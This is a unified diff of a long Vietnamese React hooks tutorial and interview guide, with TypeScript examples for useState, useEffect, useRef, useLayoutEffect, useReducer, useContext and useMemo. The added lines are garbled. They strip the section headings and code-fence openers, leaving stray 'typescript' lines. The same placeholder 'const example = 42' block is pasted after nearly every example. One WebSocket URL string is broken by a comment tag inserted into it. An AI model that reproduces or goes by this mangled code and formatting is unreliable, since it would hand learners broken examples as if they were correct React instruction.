-- **Prop key**: Giúp React nhận diện item nào thay đổi → cập nhật danh sách hiệu quả. KHÔNG bao giờ dùng index làm key khi danh sách động.
-- **Kiến trúc Fiber**: Rendering tăng dần → tạm dừng/tiếp tục công việc → hiệu năng cảm nhận tốt hơn.
-
-**🚀 Tối Ưu Hiệu Năng:**
-1. **React.memo()**: So sánh nông props → bỏ qua render lại nếu props không đổi.
-2. **useMemo()**: Cache tính toán nặng → tránh tính lại mỗi lần render.
-3. **useCallback()**: Cache tham chiếu hàm → ngăn component con render lại.
-4. **Chia Code**: `React.lazy()` + Suspense → tải components theo yêu cầu.
-5. **Ảo hóa**: `react-window` cho danh sách dài → chỉ render items hiển thị.
-6. **Tránh hàm/object inline**: Tạo tham chiếu mới mỗi lần render → con render lại.
-
-**🎨 Mẫu Thiết Kế Nâng Cao:**
-- **HOC (Component Bậc Cao)**: Bọc component để inject props. Ví dụ: `withAuth(Component)`.
-- **Render Props**: Truyền hàm làm children. Ví dụ: `<DataProvider>{data => <List data={data} />}</DataProvider>`.
-- **Compound Components**: Các component giao tiếp qua Context. Ví dứ: `<Tabs><Tab /></Tabs>`.
-- **Custom Hooks**: Trích xuất logic tái sử dụng. Bắt đầu bằng `use`. Trả về state/functions.
-
-**⚡ Tính Năng React 18+:**
-1. **Concurrent Rendering**: Render có thể ngắt → UI phản hồi trong khi cập nhật nặng.
-2. **useTransition()**: Đánh dấu cập nhật không khẩn cấp → giữ UI phản hồi.
-3. **useDeferredValue()**: Trì hoãn render nặng → debouncing tích hợp sẵn.
-4. **Suspense cho Data Fetching**: Trạng thái loading khai báo.
-5. **Server Components**: Render trên server → không có JS bundle cho component đó.
-6. **Batching Tự Động**: Gộp nhiều setState → 1 lần render (kể cả trong async).
-
-**⚠️ Lỗi Thường Gặp:**
-- **Thiếu dependencies trong useEffect**: ESLint cảnh báo → sửa hoặc vô hiệu nếu cố ý.
-- **Vòng lặp vô hạn**: useEffect không có deps array + setState bên trong → render vô hạn.
-- **Lạm dụng useMemo/useCallback**: Tối ưu sớm → chỉ dùng khi đo được vấn đề hiệu năng.
-- **Thay đổi state trực tiếp**: `state.value = 1` → React không phát hiện → dùng `setState`.
-
-**💡 Kiến Thức Senior:**
-- **useEffect vs useLayoutEffect**: useLayoutEffect chạy đồng bộ sau render, TRƯỚC trình duyệt vẽ → dùng khi cần đo DOM.
-- **StrictMode**: Gọi effects 2 lần trong dev → bắt lỗi side effects sớm.
-- **Profiler**: Component `<Profiler>` + DevTools → đo hiệu năng render.
-- **Batching**: React 18 tự động gộp mọi cập nhật (kể cả setTimeout, promises) → ít render hơn.
-- **Keys trong Reconciliation**: Key thay đổi → unmount component cũ + mount mới → reset state.
-
----
-
-**Trả lời:**
-
-Câu hỏi này bao gồm tất cả kiến thức quan trọng về React từ cơ bản đến nâng cao, bao gồm:
-- Tất cả React Hooks (useState, useEffect, useRef, useReducer, useContext, useMemo, useCallback, useLayoutEffect, useImperativeHandle, useSyncExternalStore)
-- Lifecycle của Class Component vs Functional Component
-- Virtual DOM, Reconciliation, key trong lists
-- Performance optimization (React.memo, PureComponent)
-- Advanced patterns (HOC, Render Props, Compound Components)
-- React 18+ features (Suspense, Server Components, Concurrent Rendering, useTransition, useDeferredValue)
-- React Router, Portal, Batching, Code Splitting
-
-#### **📚 PHẦN 1: REACT HOOKS - TẤT CẢ CÁC HOOK CƠ BẢN & NÂNG CAO**
-
----
-
-##### **1.1. useState - State Management Hook**
-
-**🎯 Mục đích:**
-Quản lý state trong functional component (trước đây chỉ có class component mới có state).
-
-**📖 Cách hoạt động:**
-```typescript
+typescript
 const [state, setState] = useState(initialValue);
 
 // Cách hoạt động bên trong React:
@@ -10144,18 +3740,20 @@ const [state, setState] = useState(initialValue);
 // 4. setState trigger re-render bằng cách đánh dấu fiber "dirty"
 // 5. Reconciliation: React so sánh old state vs new state
 // 6. Nếu khác (Object.is comparison) → re-render component
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**💡 Chi tiết kỹ thuật:**
-
-```typescript
+typescript
  // Chú giải: ══════════════════════════════════════════════════════════
  // Chú giải: BASIC USAGE
  // Chú giải: ══════════════════════════════════════════════════════════
 
 function Counter() {
   const [count, setCount] = useState(0); // Chú giải: Primitive state
-  
+
   return (
     <div>
       <p>Count: {count}</p>
@@ -10170,19 +3768,19 @@ function Counter() {
 
 function Counter() {
   const [count, setCount] = useState(0);
-  
+
   // ❌ Sai: Có thể bị stale closure khi gọi nhiều lần
   const handleClick = () => {
     setCount(count + 1);
     setCount(count + 1); // Chỉ tăng 1 lần vì count cũ!
   };
-  
+
   // ✅ Đúng: Luôn dùng giá trị mới nhất
   const handleClickCorrect = () => {
     setCount(prev => prev + 1);
     setCount(prev => prev + 1); // Tăng 2 lần đúng!
   };
-  
+
   return <button onClick={handleClickCorrect}>Increment Twice</button>;
 }
 
@@ -10193,10 +3791,10 @@ function Counter() {
 function ExpensiveComponent() {
  // Chú giải: ❌ Sai: Chạy expensive function mỗi lần re-render
   const [data, setData] = useState(expensiveComputation());
-  
+
   // ✅ Đúng: Chỉ chạy 1 lần khi mount
   const [data, setData] = useState(() => expensiveComputation());
-  
+
   return <div>{data}</div>;
 }
 
@@ -10219,13 +3817,13 @@ function UserForm() {
     email: '',
     address: { city: '', street: '' }
   });
-  
+
   // ❌ Sai: Mutate trực tiếp (React không detect change)
   const handleChangeBad = (e) => {
     user.name = e.target.value; // Chú giải: Mutation!
     setUser(user); // React không re-render vì cùng reference
   };
-  
+
   // ✅ Đúng: Tạo object mới (immutable update)
   const handleChange = (e) => {
     setUser(prev => ({
@@ -10233,7 +3831,7 @@ function UserForm() {
       [e.target.name]: e.target.value
     }));
   };
-  
+
  // Chú giải: ✅ Nested object update
   const handleAddressChange = (field, value) => {
     setUser(prev => ({
@@ -10244,14 +3842,14 @@ function UserForm() {
       }
     }));
   };
-  
+
   return (
     <form>
       <input name="name" onChange={handleChange} />
       <input name="email" onChange={handleChange} />
-      <input 
-        name="city" 
-        onChange={(e) => handleAddressChange('city', e.target.value)} 
+      <input
+        name="city"
+        onChange={(e) => handleAddressChange('city', e.target.value)}
       />
     </form>
   );
@@ -10265,24 +3863,24 @@ function TodoList() {
   const [todos, setTodos] = useState([
     { id: 1, text: 'Learn React', done: false }
   ]);
-  
+
   // Thêm item
   const addTodo = (text) => {
     setTodos(prev => [...prev, { id: Date.now(), text, done: false }]);
   };
-  
+
   // Xóa item
   const removeTodo = (id) => {
     setTodos(prev => prev.filter(todo => todo.id !== id));
   };
-  
+
  // Chú giải: Update item
   const toggleTodo = (id) => {
-    setTodos(prev => prev.map(todo => 
+    setTodos(prev => prev.map(todo =>
       todo.id === id ? { ...todo, done: !todo.done } : todo
     ));
   };
-  
+
  // Chú giải: Insert at position
   const insertAt = (index, text) => {
     setTodos(prev => [
@@ -10291,13 +3889,13 @@ function TodoList() {
       ...prev.slice(index)
     ]);
   };
-  
+
   return (
     <ul>
       {todos.map(todo => (
         <li key={todo.id}>
-          <input 
-            type="checkbox" 
+          <input
+            type="checkbox"
             checked={todo.done}
             onChange={() => toggleTodo(todo.id)}
           />
@@ -10308,11 +3906,13 @@ function TodoList() {
     </ul>
   );
 }
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**⚠️ Common Mistakes:**
-
-```typescript
+typescript
 // ❌ 1. Không dùng functional update khi cần previous state
 const [count, setCount] = useState(0);
 setCount(count + 1); // Chú giải: Stale closure issue
@@ -10339,17 +3939,13 @@ function Component() {
 useEffect(() => {
   setCount(1);
 }, []);
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
----
-
-##### **1.2. useEffect - Side Effects Hook**
-
-**🎯 Mục đích:**
-Xử lý side effects (API calls, subscriptions, DOM manipulation, timers) trong functional components.
-
-**📖 Cách hoạt động:**
-```typescript
+typescript
 useEffect(() => {
  // Chú giải: Effect function (chạy sau render)
   return () => {
@@ -10366,11 +3962,13 @@ useEffect(() => {
  // Chú giải: - Cleanup function chạy trước
  // Chú giải: - Effect function chạy lại
 // 6. Khi component unmount: Cleanup chạy cuối cùng
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**💡 Chi tiết kỹ thuật:**
-
-```typescript
+typescript
  // Chú giải: ══════════════════════════════════════════════════════════
 // useEffect COVERS CÁC LIFECYCLE NÀO?
  // Chú giải: ══════════════════════════════════════════════════════════
@@ -10380,11 +3978,11 @@ class ClassComponent extends React.Component {
   componentDidMount() {
  // Chú giải: Chạy 1 lần sau mount
   }
-  
+
   componentDidUpdate(prevProps, prevState) {
     // Chạy mỗi khi props/state thay đổi
   }
-  
+
   componentWillUnmount() {
  // Chú giải: Cleanup trước khi unmount
   }
@@ -10397,12 +3995,12 @@ function FunctionalComponent() {
     console.log('Mounted');
     return () => console.log('Unmounted'); // Chú giải: cleanup
   }, []); // Chú giải: Empty deps = chỉ chạy 1 lần
-  
+
   // ✅ componentDidUpdate (khi count thay đổi)
   useEffect(() => {
     console.log('Count changed:', count);
   }, [count]); // Chạy khi count thay đổi
-  
+
  // Chú giải: ✅ componentDidMount + componentDidUpdate (mỗi lần render)
   useEffect(() => {
     console.log('Every render');
@@ -10415,17 +4013,17 @@ function FunctionalComponent() {
 
 function Example({ userId }) {
   const [user, setUser] = useState(null);
-  
+
  // Chú giải: ❌ Sai: Missing dependency
   useEffect(() => {
     fetchUser(userId).then(setUser); // userId không có trong deps!
   }, []); // ESLint sẽ warning
-  
+
   // ✅ Đúng: Include all dependencies
   useEffect(() => {
     fetchUser(userId).then(setUser);
   }, [userId]); // Re-fetch khi userId thay đổi
-  
+
   // ✅ Ignore ESLint (nếu chắc chắn không cần)
   useEffect(() => {
     fetchUser(userId).then(setUser);
@@ -10439,13 +4037,13 @@ function Example({ userId }) {
 
 function Timer() {
   const [count, setCount] = useState(0);
-  
+
   useEffect(() => {
     console.log('Effect running');
     const timer = setInterval(() => {
       setCount(prev => prev + 1);
     }, 1000);
-    
+
  // Chú giải: Cleanup chạy khi:
  // Chú giải: 1. Component unmount
     // 2. Trước khi effect chạy lại (nếu deps thay đổi)
@@ -10454,7 +4052,7 @@ function Timer() {
       clearInterval(timer); // ⚠️ Quan trọng: tránh memory leak!
     };
   }, []); // Chú giải: Empty deps = cleanup chỉ chạy khi unmount
-  
+
   return <div>{count}</div>;
 }
 
@@ -10467,17 +4065,17 @@ function UserProfile({ userId }) {
   const [user, setUser] = useState(null);
   const [loading, setLoading] = useState(false);
   const [error, setError] = useState(null);
-  
+
   useEffect(() => {
     let cancelled = false; // Chú giải: Prevent setting state on unmounted component
-    
+
     const fetchUser = async () => {
       try {
         setLoading(true);
         setError(null);
         const response = await fetch(`/api/users/${userId}`);
         const data = await response.json();
-        
+
         if (!cancelled) {
           setUser(data);
         }
@@ -10491,14 +4089,14 @@ function UserProfile({ userId }) {
         }
       }
     };
-    
+
     fetchUser();
-    
+
     return () => {
       cancelled = true; // Chú giải: Cleanup: mark as cancelled
     };
   }, [userId]);
-  
+
   if (loading) return <div>Loading...</div>;
   if (error) return <div>Error: {error}</div>;
   return <div>{user?.name}</div>;
@@ -10507,7 +4105,7 @@ function UserProfile({ userId }) {
  // Chú giải: 2. Event Listeners
 function WindowSize() {
   const [size, setSize] = useState({ width: 0, height: 0 });
-  
+
   useEffect(() => {
     const handleResize = () => {
       setSize({
@@ -10515,37 +4113,37 @@ function WindowSize() {
         height: window.innerHeight
       });
     };
-    
+
  // Chú giải: Add listener
     window.addEventListener('resize', handleResize);
     handleResize(); // Chú giải: Set initial size
-    
+
  // Chú giải: Cleanup: Remove listener
     return () => {
       window.removeEventListener('resize', handleResize);
     };
   }, []); // Chú giải: No deps = setup once
-  
+
   return <div>{size.width} x {size.height}</div>;
 }
 
  // Chú giải: 3. Subscriptions (WebSocket, EventEmitter)
 function ChatRoom({ roomId }) {
   const [messages, setMessages] = useState([]);
-  
+
   useEffect(() => {
     const socket = new WebSocket(`ws: // Chú giải: chat.com/${roomId}`);
-    
+
     socket.onmessage = (event) => {
       setMessages(prev => [...prev, JSON.parse(event.data)]);
     };
-    
+
  // Chú giải: Cleanup: Close connection
     return () => {
       socket.close();
     };
   }, [roomId]); // Re-connect khi đổi room
-  
+
   return (
     <ul>
       {messages.map((msg, i) => <li key={i}>{msg.text}</li>)}
@@ -10558,7 +4156,7 @@ function PageTitle({ title }) {
   useEffect(() => {
     const prevTitle = document.title;
     document.title = title;
-    
+
     return () => {
       document.title = prevTitle; // Chú giải: Restore
     };
@@ -10575,14 +4173,16 @@ function useSyncWithLocalStorage(key, value) {
 function Settings() {
   const [theme, setTheme] = useState('light');
   useSyncWithLocalStorage('theme', theme);
-  
+
   return <button onClick={() => setTheme('dark')}>Dark Mode</button>;
 }
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**⚠️ Common Mistakes:**
-
-```typescript
+typescript
 // ❌ 1. Không cleanup subscriptions/timers
 useEffect(() => {
   const timer = setInterval(() => {}, 1000);
@@ -10631,20 +4231,13 @@ useEffect(() => {
   });
   return () => { cancelled = true; };
 }, [userId]);
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
----
-
-##### **1.3. useRef - Mutable Reference Hook**
-
-**🎯 Mục đích:**
-1. Access DOM elements trực tiếp
-2. Lưu giá trị mutable không trigger re-render
-3. Lưu previous value của state/props
-
-**📖 useRef vs useState:**
-
-```typescript
+typescript
 // useState: Trigger re-render khi thay đổi
 const [count, setCount] = useState(0);
 setCount(1); // Chú giải: → Component re-render
@@ -10656,30 +4249,32 @@ countRef.current = 1; // → Component KHÔNG re-render
  // Chú giải: Timeline:
  // Chú giải: useState: Change state → Schedule re-render → Re-render → Paint
  // Chú giải: useRef: Change ref.current → (Nothing happens, no re-render)
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**💡 Chi tiết kỹ thuật:**
-
-```typescript
+typescript
  // Chú giải: ══════════════════════════════════════════════════════════
  // Chú giải: 1. DOM ACCESS (Primary use case)
  // Chú giải: ══════════════════════════════════════════════════════════
 
 function AutoFocusInput() {
   const inputRef = useRef<HTMLInputElement>(null);
-  
+
   useEffect(() => {
  // Chú giải: Access DOM node directly
     inputRef.current?.focus();
   }, []);
-  
+
   return <input ref={inputRef} />;
 }
 
  // Chú giải: Complex DOM manipulation
 function VideoPlayer() {
   const videoRef = useRef<HTMLVideoElement>(null);
-  
+
   const play = () => videoRef.current?.play();
   const pause = () => videoRef.current?.pause();
   const seek = (time: number) => {
@@ -10687,7 +4282,7 @@ function VideoPlayer() {
       videoRef.current.currentTime = time;
     }
   };
-  
+
   return (
     <>
       <video ref={videoRef} src="/video.mp4" />
@@ -10705,24 +4300,24 @@ function VideoPlayer() {
 function Timer() {
   const [count, setCount] = useState(0);
   const intervalRef = useRef<number>(null);
-  
+
   const start = () => {
     // Lưu interval ID để clear sau này
     intervalRef.current = setInterval(() => {
       setCount(prev => prev + 1);
     }, 1000);
   };
-  
+
   const stop = () => {
     if (intervalRef.current) {
       clearInterval(intervalRef.current);
     }
   };
-  
+
   useEffect(() => {
     return () => stop(); // Chú giải: Cleanup
   }, []);
-  
+
   return (
     <div>
       <p>Count: {count}</p>
@@ -10738,18 +4333,18 @@ function Timer() {
 
 function usePrevious<T>(value: T): T | undefined {
   const ref = useRef<T>();
-  
+
   useEffect(() => {
     ref.current = value; // Chú giải: Update ref AFTER render
   });
-  
+
   return ref.current; // Trong arrow function với block `{ }` phải dùng `return` để trả giá trị; với expression có thể trả ngầm (implicit return).
 }
 
 function Counter() {
   const [count, setCount] = useState(0);
   const prevCount = usePrevious(count);
-  
+
   return (
     <div>
       <p>Current: {count}</p>
@@ -10766,15 +4361,15 @@ function Counter() {
 function ClickTracker() {
   const [renderCount, setRenderCount] = useState(0);
   const clickCountRef = useRef(0); // Không trigger re-render
-  
+
   const handleClick = () => {
     clickCountRef.current++; // Chú giải: Update ref (no re-render)
     console.log('Clicks:', clickCountRef.current);
-    
+
     // Force re-render để show UI
     setRenderCount(prev => prev + 1);
   };
-  
+
   return (
     <div>
       <p>Renders: {renderCount}</p>
@@ -10790,14 +4385,14 @@ function ClickTracker() {
 
 function MeasureElement() {
   const [height, setHeight] = useState(0);
-  
+
   // Callback ref: được gọi khi element mount/unmount
   const measureRef = useCallback((node: HTMLDivElement | null) => {
     if (node !== null) {
       setHeight(node.getBoundingClientRect().height);
     }
   }, []);
-  
+
   return (
     <>
       <div ref={measureRef}>
@@ -10807,11 +4402,13 @@ function MeasureElement() {
     </>
   );
 }
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**⚠️ Common Mistakes:**
-
-```typescript
+typescript
 // ❌ 1. Expect re-render khi thay đổi ref
 const countRef = useRef(0);
 countRef.current++;
@@ -10838,18 +4435,13 @@ inputRef.current.focus(); // ❌ Có thể null!
 
 // ✅ Fix: Check null hoặc dùng optional chaining
 inputRef.current?.focus();
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
----
-
-##### **1.4. useLayoutEffect - Synchronous Effect Hook**
-
-**🎯 Mục đích:**
-Chạy effect TRƯỚC KHI browser paint (synchronous), dùng cho DOM measurements hoặc mutations cần xảy ra trước khi user thấy UI.
-
-**📖 useEffect vs useLayoutEffect Timeline:**
-
-```typescript
+typescript
  // Chú giải: useEffect:
  // Chú giải: 1. React renders component (Virtual DOM)
  // Chú giải: 2. React commits to real DOM
@@ -10861,11 +4453,13 @@ Chạy effect TRƯỚC KHI browser paint (synchronous), dùng cho DOM measuremen
  // Chú giải: 2. React commits to real DOM
  // Chú giải: 3. useLayoutEffect runs (BEFORE paint - BLOCKS UI)
 // 4. Browser paints (user thấy UI đã updated)
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**💡 Chi tiết kỹ thuật:**
-
-```typescript
+typescript
  // Chú giải: ══════════════════════════════════════════════════════════
 // KHI NÀO DÙNG useLayoutEffect?
  // Chú giải: ══════════════════════════════════════════════════════════
@@ -10874,19 +4468,19 @@ Chạy effect TRƯỚC KHI browser paint (synchronous), dùng cho DOM measuremen
 function Tooltip() {
   const [tooltip, setTooltip] = useState({ x: 0, y: 0 });
   const buttonRef = useRef<HTMLButtonElement>(null);
-  
+
   // ❌ useEffect: User thấy tooltip nhảy vì chạy SAU paint
   useEffect(() => {
     const rect = buttonRef.current?.getBoundingClientRect();
     setTooltip({ x: rect.left, y: rect.bottom });
   }, []);
-  
+
   // ✅ useLayoutEffect: Tooltip đúng vị trí ngay từ đầu
   useLayoutEffect(() => {
     const rect = buttonRef.current?.getBoundingClientRect();
     setTooltip({ x: rect.left, y: rect.bottom });
   }, []);
-  
+
   return (
     <>
       <button ref={buttonRef}>Hover me</button>
@@ -10900,7 +4494,7 @@ function Tooltip() {
  // Chú giải: ✅ Use case 2: Scroll position (avoid jump)
 function RestoreScroll() {
   const contentRef = useRef<HTMLDivElement>(null);
-  
+
   useLayoutEffect(() => {
  // Chú giải: Restore scroll TRƯỚC khi paint → no visual jump
     const savedScroll = localStorage.getItem('scrollPos');
@@ -10908,18 +4502,18 @@ function RestoreScroll() {
       contentRef.current.scrollTop = parseInt(savedScroll);
     }
   }, []);
-  
+
   useEffect(() => {
     const handleScroll = () => {
       if (contentRef.current) {
         localStorage.setItem('scrollPos', contentRef.current.scrollTop.toString());
       }
     };
-    
+
     contentRef.current?.addEventListener('scroll', handleScroll);
     return () => contentRef.current?.removeEventListener('scroll', handleScroll);
   }, []);
-  
+
   return <div ref={contentRef} style={{ height: 400, overflow: 'auto' }}>
     {/* Long content */}
   </div>;
@@ -10928,14 +4522,14 @@ function RestoreScroll() {
  // Chú giải: ✅ Use case 3: Animate before paint
 function AnimatedBox() {
   const boxRef = useRef<HTMLDivElement>(null);
-  
+
   useLayoutEffect(() => {
  // Chú giải: Set initial position BEFORE paint
     if (boxRef.current) {
       boxRef.current.style.transform = 'translateX(-100px)';
       boxRef.current.style.opacity = '0';
     }
-    
+
  // Chú giải: Then animate (browser batches with paint)
     requestAnimationFrame(() => {
       if (boxRef.current) {
@@ -10945,14 +4539,16 @@ function AnimatedBox() {
       }
     });
   }, []);
-  
+
   return <div ref={boxRef}>Animated Box</div>;
 }
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**⚠️ Khi nào KHÔNG nên dùng useLayoutEffect:**
-
-```typescript
+typescript
 // ❌ Data fetching (không cần sync)
 useLayoutEffect(() => {
   fetch('/api').then(setData); // Chú giải: Block UI unnecessarily!
@@ -10978,30 +4574,19 @@ useEffect(() => {
  // Chú giải: Rule of thumb:
  // Chú giải: - useEffect: 99% cases (default choice)
 // - useLayoutEffect: Chỉ khi có visual bugs (flicker, jump, wrong position)
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
----
-
-##### **1.5. useReducer - Complex State Management Hook**
-
-**🎯 Mục đích:**
-Quản lý state phức tạp với logic xử lý tập trung (giống Redux pattern).
-
-**📖 Khi nào dùng useReducer thay vì useState:**
-- State có nhiều sub-values liên quan
-- State update logic phức tạp (nhiều actions)
-- Next state phụ thuộc vào previous state
-- Muốn centralize state logic (dễ test)
-
-**💡 Chi tiết kỹ thuật:**
-
-```typescript
+typescript
  // Chú giải: ══════════════════════════════════════════════════════════
  // Chú giải: BASIC PATTERN
  // Chú giải: ══════════════════════════════════════════════════════════
 
 type State = { count: number };
-type Action = 
+type Action =
   | { type: 'increment' }
   | { type: 'decrement' }
   | { type: 'reset' }
@@ -11024,7 +4609,7 @@ function reducer(state: State, action: Action): State {
 
 function Counter() {
   const [state, dispatch] = useReducer(reducer, { count: 0 });
-  
+
   return (
     <div>
       <p>Count: {state.count}</p>
@@ -11053,13 +4638,13 @@ function todoReducer(state: TodoState, action: TodoAction): TodoState {
     case 'ADD_TODO':
       return {
         ...state,
-        todos: [...state.todos, { 
-          id: Date.now(), 
-          text: action.text, 
-          done: false 
+        todos: [...state.todos, {
+          id: Date.now(),
+          text: action.text,
+          done: false
         }]
       };
-      
+
     case 'TOGGLE_TODO':
       return {
         ...state,
@@ -11067,22 +4652,22 @@ function todoReducer(state: TodoState, action: TodoAction): TodoState {
           todo.id === action.id ? { ...todo, done: !todo.done } : todo
         )
       };
-      
+
     case 'DELETE_TODO':
       return {
         ...state,
         todos: state.todos.filter(todo => todo.id !== action.id)
       };
-      
+
     case 'SET_FILTER':
       return { ...state, filter: action.filter };
-      
+
     case 'CLEAR_COMPLETED':
       return {
         ...state,
         todos: state.todos.filter(todo => !todo.done)
       };
-      
+
     default:
       return state;
   }
@@ -11093,16 +4678,16 @@ function TodoApp() {
     todos: [],
     filter: 'all'
   });
-  
+
   const visibleTodos = state.todos.filter(todo => {
     if (state.filter === 'active') return !todo.done;
     if (state.filter === 'completed') return todo.done;
     return true;
   });
-  
+
   return (
     <div>
-      <input 
+      <input
         type="text"
         onKeyPress={(e) => {
           if (e.key === 'Enter') {
@@ -11111,7 +4696,7 @@ function TodoApp() {
           }
         }}
       />
-      
+
       <ul>
         {visibleTodos.map(todo => (
           <li key={todo.id}>
@@ -11127,7 +4712,7 @@ function TodoApp() {
           </li>
         ))}
       </ul>
-      
+
       <div>
         <button onClick={() => dispatch({ type: 'SET_FILTER', filter: 'all' })}>
           All
@@ -11160,11 +4745,13 @@ function Counter() {
   const [state, dispatch] = useReducer(reducer, 10, init);
  // Chú giải: state.count = 20 (10 * 2)
 }
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**⚠️ useReducer vs useState:**
-
-```typescript
+typescript
  // Chú giải: useState: Simple state
 const [count, setCount] = useState(0);
 const [name, setName] = useState('');
@@ -11177,17 +4764,13 @@ const [state, dispatch] = useReducer(formReducer, initialState);
  // Chú giải: Rule:
  // Chú giải: - 1-3 related values → useState
  // Chú giải: - 4+ related values OR complex logic → useReducer
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
----
-
-##### **1.6. useContext - Consume Context Values**
-
-**🎯 Mục đích:** Share data across component tree mà không cần pass props (theme, auth, language).
-
-**📖 Cách hoạt động:**
-
-```typescript
+typescript
  // Chú giải: Context flow:
  // Chú giải: 1. createContext() → Tạo Context object
  // Chú giải: 2. <Provider value={...}> → Cung cấp value
@@ -11198,11 +4781,13 @@ const [state, dispatch] = useReducer(formReducer, initialState);
 // - Context re-render TẤT CẢ consumers khi value thay đổi
 // - Không có selector mechanism (khác Redux)
 // - Cần optimize bằng React.memo hoặc useMemo
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**💡 Chi tiết kỹ thuật:**
-
-```typescript
+typescript
  // Chú giải: ══════════════════════════════════════════════════════════
  // Chú giải: BASIC USAGE
  // Chú giải: ══════════════════════════════════════════════════════════
@@ -11212,7 +4797,7 @@ const ThemeContext = createContext<Theme>('light');
 
 function App() {
   const [theme, setTheme] = useState<Theme>('light');
-  
+
   return (
     <ThemeContext.Provider value={theme}>
       <Toolbar />
@@ -11229,7 +4814,7 @@ function Toolbar() {
 
 function ThemedButton() {
   const theme = useContext(ThemeContext); // Chú giải: ✅ Clean syntax
-  
+
   return (
     <button className={theme}>
       I am styled with {theme} theme
@@ -11262,7 +4847,7 @@ function App() {
   const [theme, setTheme] = useState('light');
   const [user, setUser] = useState(null);
   const [lang, setLang] = useState('en');
-  
+
   return (
     <ThemeContext.Provider value={theme}>
       <UserContext.Provider value={user}>
@@ -11278,7 +4863,7 @@ function Dashboard() {
   const theme = useContext(ThemeContext);
   const user = useContext(UserContext);
   const lang = useContext(LanguageContext);
-  
+
   return (
     <div className={theme}>
       Welcome {user?.name} ({lang})
@@ -11302,11 +4887,11 @@ const AuthContext = createContext<AuthContextType | undefined>(undefined);
  // Chú giải: Custom hook với error checking
 function useAuth() {
   const context = useContext(AuthContext);
-  
+
   if (context === undefined) {
     throw new Error('useAuth must be used within AuthProvider');
   }
-  
+
   return context;
 }
 
@@ -11314,7 +4899,7 @@ function useAuth() {
 function AuthProvider({ children }: { children: ReactNode }) {
   const [user, setUser] = useState<User | null>(null);
   const [loading, setLoading] = useState(false);
-  
+
   const login = async (email: string, password: string) => {
     setLoading(true);
     try {
@@ -11324,17 +4909,17 @@ function AuthProvider({ children }: { children: ReactNode }) {
       setLoading(false);
     }
   };
-  
+
   const logout = () => {
     authService.logout();
     setUser(null);
   };
-  
+
   const value = useMemo(
     () => ({ user, login, logout, loading }),
     [user, loading]
   );
-  
+
   return <AuthContext.Provider value={value}>{children}</AuthContext.Provider>;
 }
 
@@ -11349,7 +4934,7 @@ function App() {
 
 function Dashboard() {
   const { user, logout } = useAuth(); // Chú giải: ✅ Type-safe, error checking
-  
+
   return (
     <div>
       <p>Welcome {user?.name}</p>
@@ -11366,10 +4951,10 @@ function Dashboard() {
 function AppBad() {
   const [user, setUser] = useState(null);
   const [theme, setTheme] = useState('light');
-  
+
  // Chú giải: ❌ New object mỗi render → all consumers re-render
   const value = { user, theme, setUser, setTheme };
-  
+
   return (
     <AppContext.Provider value={value}>
       <Component1 /> {/* Re-render khi theme đổi dù chỉ dùng user */}
@@ -11382,10 +4967,10 @@ function AppBad() {
 function AppGood() {
   const [user, setUser] = useState(null);
   const [theme, setTheme] = useState('light');
-  
+
   const userValue = useMemo(() => ({ user, setUser }), [user]);
   const themeValue = useMemo(() => ({ theme, setTheme }), [theme]);
-  
+
   return (
     <UserContext.Provider value={userValue}>
       <ThemeContext.Provider value={themeValue}>
@@ -11401,23 +4986,13 @@ const Component1 = React.memo(function Component1() {
   const { user } = useContext(UserContext);
   return <div>{user?.name}</div>;
 });
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
----
-
-##### **1.7. useMemo - Memoized Value Hook**
-
-**🎯 Mục đích:**
-Cache kết quả của expensive calculations, chỉ re-compute khi dependencies thay đổi.
-
-**📖 Khi nào dùng useMemo:**
-1. Expensive calculations (sorting, filtering large arrays)
-2. Preventing re-creation of objects/arrays (pass to child components)
-3. Optimizing child component re-renders
-
-**💡 Chi tiết kỹ thuật:**
-
-```typescript
+typescript
  // Chú giải: ══════════════════════════════════════════════════════════
  // Chú giải: BASIC PATTERN
  // Chú giải: ══════════════════════════════════════════════════════════
@@ -11425,7 +5000,7 @@ Cache kết quả của expensive calculations, chỉ re-compute khi dependencie
 function ProductList({ products, filter }) {
  // Chú giải: ❌ Without useMemo: Sort lại MỖI lần component re-render
   const sortedProducts = products.sort((a, b) => a.price - b.price);
-  
+
   // ✅ With useMemo: Chỉ sort khi products hoặc filter thay đổi
   const sortedProducts = useMemo(() => {
     console.log('Sorting...'); // Chú giải: Chỉ log khi re-compute
@@ -11433,7 +5008,7 @@ function ProductList({ products, filter }) {
       .filter(p => p.category === filter)
       .sort((a, b) => a.price - b.price);
   }, [products, filter]); // Chú giải: Dependencies
-  
+
   return (
     <ul>
       {sortedProducts.map(p => <li key={p.id}>{p.name}</li>)}
@@ -11453,7 +5028,7 @@ function Fibonacci({ n }) {
     }
     return fib(n);
   }, [n]);
-  
+
   return <div>Fibonacci({n}) = {result}</div>;
 }
 
@@ -11464,16 +5039,16 @@ function Fibonacci({ n }) {
 function Parent() {
   const [count, setCount] = useState(0);
   const [name, setName] = useState('');
-  
+
   // ❌ New object mỗi render → Child re-render dù props "giống"
   const config = { theme: 'dark', lang: 'en' };
-  
+
   // ✅ Stable reference → Child chỉ re-render khi config thực sự đổi
   const config = useMemo(() => ({
     theme: 'dark',
     lang: 'en'
   }), []); // Chú giải: No deps = never re-create
-  
+
   return (
     <>
       <input value={name} onChange={e => setName(e.target.value)} />
@@ -11497,11 +5072,11 @@ function TodoList({ todos }) {
     total: todos.length,
     completed: todos.filter(t => t.done).length,
     active: todos.filter(t => !t.done).length,
-    completionRate: todos.length > 0 
+    completionRate: todos.length > 0
